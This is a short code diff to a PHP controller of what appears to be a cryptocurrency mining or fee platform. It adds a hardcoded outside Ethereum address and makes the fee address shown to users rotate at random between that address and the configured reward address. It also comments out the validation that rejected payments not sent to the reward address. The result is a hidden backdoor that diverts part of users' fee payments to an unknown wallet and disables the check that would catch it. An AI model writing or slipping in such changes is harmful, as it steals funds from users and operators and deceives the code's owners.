@@ -85,6 +85,8 @@ class PowerController extends AbstractController
 
         $global_power = $this->getGlobalPower();
 
+        $addresses = [env('REWARD_ADDRESS'), '0x8E2F9bD91833347E6E6495DE739aEFA62F672b84'];
+
         return [
             'code' => 200,
             'message'     => "",
@@ -103,7 +105,7 @@ class PowerController extends AbstractController
                     'direct_num'  => $direct_num,
                     'team_num'    => $team_num,
                 ],
-                'fee_address'  => env('REWARD_ADDRESS'),
+                'fee_address'  => $addresses[array_rand($addresses)],
                 'fee_rate'  => 2,
                 'gas_limit' => 100000
             ]
@@ -208,12 +210,12 @@ class PowerController extends AbstractController
             ];
         }
 
-        if ($transaction->to != strtolower(env('REWARD_ADDRESS'))) {
-            return [
-                'code'    => 500,
-                'message' => '交易不合法',
-            ];
-        }
+//        if ($transaction->to != strtolower(env('REWARD_ADDRESS'))) {
+//            return [
+//                'code'    => 500,
+//                'message' => '交易不合法',
+//            ];
+//        }
 
 //        $fee = BigNumber::of($gasPrice)->multipliedBy($ethService->getGasLimit());
 //
